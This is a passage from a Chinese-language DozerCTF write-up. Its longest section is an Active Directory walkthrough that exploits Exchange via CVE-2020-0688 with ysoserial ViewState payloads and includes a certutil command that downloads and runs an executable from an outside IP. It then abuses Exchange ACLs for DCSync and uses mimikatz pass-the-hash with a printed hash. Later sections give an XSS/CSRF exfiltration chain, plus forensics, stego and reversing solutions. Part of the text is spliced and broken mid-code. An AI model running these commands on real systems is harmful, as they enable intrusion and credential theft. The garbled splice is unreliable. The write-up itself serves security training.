    uSNChanged: 38683
    company: Dozerctf{3fed7db7fee7a1771b58d309bf9ca851}
同时发现组内有exchange服务器
    member: CN=Exchange Install Domain Servers,CN=Microsoft Exchange System Objects,DC=dozer,DC=org
    member: CN=DOZER-EXCHANGE,CN=Computers,DC=dozer,DC=org
使用regeorg代理进内网(方式很多,甚至还有师傅frp了rdp)
    python reGeorgSocksProxy.py -u http://web1616.dozerjit.club:8086/errors/tunnel.jsp -l 0.0.0.0 -p 1081
访问
已知一个域内普通账户和exchange,熟悉ad的话很容易想到cve-2020-0688(这里exchange ssrf应该也是存在的,结合ntlm
relay 也是一种思路).先看看这个邮箱账户等不能登陆.
在mailbox里获取到第三个flag.
    Dozerctf{9b35c916c37b00f3359d49b6c9c99667}
cve2020-0688 github几个漏洞工具都无法执行命令,匹配session的地方有问题,手工生成payload获取到exchange权限.
     ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "ping mydatahere.2d5facd857db3251fd2c.d.zhack.ca" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="d5413748-06a2-4774-8b8a-515ddaf5f383" --isdebug -islegacy
详情参考:
这台机器上没有360,直接使用c2方便执行命令.当然也可以在excheng的owa/auth目录或者exp/auth目录放shell,默认是system权限,在root用户桌面上找到第四个flag
    certutil.exe -urlcache -split -f "http://39.97.163.55:8080/1.exe" c:windowstemp1.exe && 1.exe
    ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "certutil.exe -urlcache -split -f "http://39.97.163.55:8080/1.exe" c:windowstemp1.exe && c:windowstemp1.exe" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="d5413748-06a2-4774-8b8a-515ddaf5f383" --isdebug -islegacy
访问:
    https://10.10.10.4/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=%2fwEygggAAQAAAP%2f%2f%2f%2f8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAACkBjw%2feG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8%2bDQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vMzkuOTcuMTYzLjU1OjgwODAvMS5leGUgYzpcd2luZG93c1x0ZW1wXDEuZXhlICZhbXA7JmFtcDsgYzpcd2luZG93c1x0ZW1wXDEuZXhlIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8%2bDQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsMDg4FT7ljhPqGSZN4Nls5Uth%2bCw%3D%3D
    Dozerctf{1193173239563ee49664b5e500f687ba}
尝试在exchange上抓hash,如果域管登过且没重启就可以拿到域管hash,如果没有则利用exchange writeacl
给普通用户dcsync的权限,去同步域管的hash.
具体可以参考:[域渗透——使用Exchange服务器中特定的ACL实现域提权](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%89%B9%E5%AE%9A%E7%9A%84ACL%E5%AE%9E%E7%8E%B0%E5%9F%9F%E6%8F%90%E6%9D%83/)
首先在导出的域信息里找到Exchange Trusted Subsystem组的dn:
    CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=dozer,DC=org
添加shark用户对exchange组的完全访问权限.
    $RawObject = Get-DomainObject -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=dozer,DC=org" -Raw
    $TargetObject = $RawObject.GetDirectoryEntry()
    $ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity shark -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
    $TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACE)
    $TargetObject.PsBase.CommitChanges()
将shark加入Exchange Trusted Subsystem组
    import-module .Microsoft.ActiveDirectory.Management.dll
    Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members shark
至此shark具有了dcsync的权限,我们网络是通的并且有密码,可以直接在本地dcsync或者上传mimikatz到exchange上同步:
首先先添加凭证,再同步hash
    cmdkey /add:dozer-dc.dozer.org /user:shark /pass:P@ssw0rd
    lsadump::dcsync /domain:dozer /dc:dozer-dc /all
获得域管hash后无法破解,在本地使用mimikatz pth 横向移动到dc上.
    privilege::debug
    sekurlsa::pth /user:administator /domain:dozer /ntlm:4aefab3403a99c6037fbe7f382a881f6
查看管理员桌面得到第五个flag:
    type \10.10.10.3c$usersadministratordesktopflag.txt
Dozerctf{9e81075297066f2275ba49ede1cbe3cc}
###  fake phpminiadmin
**题目描述**
山寨phpminiadmin
**出题思路**
福利题,简化了2018巅峰极客L3m0n师傅出的题目.
**解题过程**
执行sql语句处利用hex可以进行xss,结合contact功能处的csrf可以组合利用.
    select 0x3c7363726970743e616c6572742831293c2f7363726970743e
成功弹窗
生成csrf payload
编码前的xss payload为:
将csrf的payload放在vps上,在contact处提交vps上payload的地址.
在放payload的vps上发现referer是后台地址,访问提示需要登陆地点错误.
修改payload后读取后台源码获得flag.
使用xss平台等方式读取:
    var u = 'http://vps/';
    var cr;
    if (document.charset) {
            cr = document.charset
    } else if (document.characterSet) {
            cr = document.characterSet
    };
    function createXmlHttp() {
            if (window.XMLHttpRequest) {
                        xmlHttp = new XMLHttpRequest()
                    } else {
                            var MSXML = new Array('MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP');
                            for (var n = 0; n volatility.exe -f memory —profile=Win7SP1x64 filescan|findstr
“flag”尝试查找带flag的文件发现一个analyse.zip文件
volatility.exe -f memory —profile=Win7SP1x64 dumpfiles -Q 0x000000001e85f430
—dump-dir=outdir导出文件，修改文件名
根据提示查找密码，猜测密码为用户登陆密码
使用volatility.exe -f memory —profile=Win7SP1x64 hashdump查看，解出NTLM
解压得到一个usb流量包，分析得
运行脚本得到键盘记录
AUTOKEY YLLTMFTNXBKGVCYYDBUHDLCPSPSPTSWRMWJJMNJGTYLKEGITTOIBGO
对于自动密钥进行暴破
代码详见
压缩包密码：thiskeyboardsucksforyou
得到的flag.txt是base64隐写
运行脚本得到flag
代码
    def get_base64_diff_value(s1, s2):
      base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
      res = 0
      for i in xrange(len(s2)):
        if s1[i] != s2[i]:
          return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))
      return res
    def solve_stego():
      with open('flag.txt', 'rb') as f:
    ​    file_lines = f.readlines()
    ​    bin_str = ''
    ​    for line in file_lines:
    ​      steg_line = line.replace('n', '')
    ​      norm_line = line.replace('n', '').decode('base64').encode('base64').replace('n', '')
    ​      diff = get_base64_diff_value(steg_line, norm_line)
    ​      print diff
    ​      pads_num = steg_line.count('=')
    ​      if diff:
    ​        bin_str += bin(diff)[2:].zfill(pads_num * 2)
    ​      else:
    ​        bin_str += '0' * pads_num * 2
    ​      print goflag(bin_str)
    def goflag(bin_str):
      res_str = ''
      for i in xrange(0, len(bin_str), 8):
    ​    res_str += chr(int(bin_str[i:i + 8], 2))
      return res_str
    if __name__ == '__main__':
    solve_stego()
    flag：Dozerctf {itis_e4sy_4U2_analyse}
###  upload
发现上传的图片并导出
图片实际上是一个压缩包，改文件后缀名。
根据压所文件大小猜测crc暴破
flag：Dozerctf{can_U_find_thefilefrom_traffic}
###  py吗？
修改图片高度
lsb隐写
导出的base64根据提示猜测为py或pyc文件
将pyc文件反编译得到加密脚本
写出对应揭秘脚本得到flag
flag：Dozerctf{python_is_the_best_language!}
## Re
###  貌似有些不对
**题目描述**
这是谁的课程设计？做的好烂！
**出题思路**
本题是替代签到题，IDA打开直接分析就可以，放了一个换表BASE64和一个栅栏，很简单。
**解题思路**
如出题思路描述
###  eazy_crrakeMe
**题目描述**
真·签到题(逆向)  
链接： 密码：rhjr52
**出题思路**
本题是原本设定好的签到题，简单的MAC逆向，代码就是将输入进行加法法和异或运算，特别简单，主要考察的就是MAC的包结构。
**解题思路**
本题解包得到程序文件，拖入IDA即可分析，本题主要是将输入内容先＋0x10然后^6，可以很容易写出解密程序
    dir=[50,89,108,83,100,53,98,80,109,52,87,82,73,87,102,102,90,83,73,95,101,73,8
    7,90,101,89,73,81,89,89,82,23,107]
    flag=""
    for i in dir:
        flag+=chr((i^6)-0x10)
    print (flag)
###  easy_maze
**题目描述**
应该是比较容易的maze了吧！最终结果请以Dozerctf{}格式提交。  
链接： 密码：qbeb7n
**出题思路**
常规的迷宫已经不太好玩了，所以就要在迷宫实现的过程中添加一些有趣的东西，本题在迷宫行走的过程中，对于上下左右进行了有规律的交换，这样就可以增加迷宫的一些趣味（出题人并不知道这种思路的出题有人出过了没）
    char direct[4] = { 'W','A','S','D' };
    void liftmv()
    {
        char a = direct[0];
        direct[0] = direct[1];
        direct[1] = direct[2];
        direct[2] = direct[3];
        direct[3] = a;
    }
    void rightmv()
    {
        char b = direct[3];
        direct[3] = direct[2];
        direct[2] = direct[1];
        direct[1] = direct[0];
        direct[0] = b;
    }
    void downmv()
    {
        char a = direct[1];
        direct[1] = direct[3];
        direct[3] = a;
        char b = direct[0];
        direct[0] = direct[2];
        direct[2] = b;
    }
    void upmv()
    {
        char b = direct[0];
        direct[0] = direct[2];
        direct[2] = b;
    }
**解题思路**
本题其实还是属于常规的迷宫，并不难，迷宫IDA即可dump出，然后可以先按照WASD的方向先走一遍，然后将路径按照规则进行置换就可以了。
    #include 
    #include 
    #include 
    #include 
    using namespace std;
    char direct[4] = { 'W','A','S','D' };
    void liftmv()
    {
        char a = direct[0];
        direct[0] = direct[1];